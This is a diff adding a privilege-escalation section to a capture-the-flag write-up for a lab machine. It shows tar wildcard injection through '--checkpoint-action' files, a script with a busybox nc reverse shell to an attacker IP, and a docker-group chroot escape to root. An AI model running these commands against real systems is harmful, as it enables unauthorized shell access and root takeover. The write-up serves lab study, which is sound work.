@@ -39,7 +39,25 @@ By using this payload and just changing the offset, I find the following column 
 Now I can log into jake's ssh account and get the first flag.
 Now if I run `sudo -l` I get this: <br />
 ![image](https://github.com/user-attachments/assets/b05f403e-9d07-4c9f-a6d1-98cc8cbec752)<br />
+Also, there are three users with a bash shell:<br />
+![Screenshot 2025-04-11 103648](https://github.com/user-attachments/assets/38e112e6-5ccb-42cc-858b-3f5df82d3dce)<br />
+And these are the groups they belong to:<br />
+![Screenshot 2025-04-11 103805](https://github.com/user-attachments/assets/9d1c3931-6b22-45ca-8275-f4a06648967a)<br />
+So I believe that I need to become the user `marketplace`, because it belongs to the group `sudo`. Here's how to spawn a shell as michael:<br />
+![image](https://github.com/user-attachments/assets/57f06e33-ffa9-44c6-8ef3-ace646141a0c)<br />
+I am exploiting `tar`'s wildcards, which are basically files that tar executes when it sees them. [This website](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa) explains this attack very well. To exploit it, go inside `/opt/backups` and run the following commands:
 
+    echo "" > '--checkpoint=1'
+    echo "" > '--checkpoint-action=exec=sh privesc.sh'
+    nano privesc.sh
+Inside the `privesc.sh` file I put the following code: 
+
+    #!/bin/bash
+    busybox nc 10.11.127.156 9001 -e sh
+Now I'm michael, let's see what I can do. I run `linpeas` and it finds this:<br />
+![image](https://github.com/user-attachments/assets/acf4f1bf-c675-4fb2-a58b-69c7868a126a)<br />
+I belong to the `docker` group. Users in the docker group can execute the `docker` command, which uses the `docker daemon`, which always has root privileges. The exploit that uses docker privileges can be easily found on [gtfobins](https://gtfobins.github.io/gtfobins/docker/#sudo), just run `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` and become root!:<br />
+![image](https://github.com/user-attachments/assets/140b33d7-985f-43bb-b271-734dea79453e)<br />
 
 
 
